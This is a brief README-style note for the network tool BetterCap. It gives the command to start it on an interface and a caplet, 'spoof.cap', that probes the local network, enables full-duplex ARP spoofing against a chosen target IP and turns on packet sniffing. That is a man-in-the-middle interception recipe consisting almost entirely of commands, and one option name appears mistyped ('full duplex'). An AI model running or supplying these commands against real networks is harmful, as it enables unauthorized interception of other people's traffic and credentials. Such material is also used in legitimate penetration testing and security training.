# BetterCap

![bettercap](https://raw.githubusercontent.com/bettercap/media/master/logo.png)

**To start with the program**

bettercap iface <name of interface connected>

**spoof.cap**

net.probe on

set arp.spoof.full duplex true

set arp.spoof.target <target IP>

arp.spoof on

net.sniff on
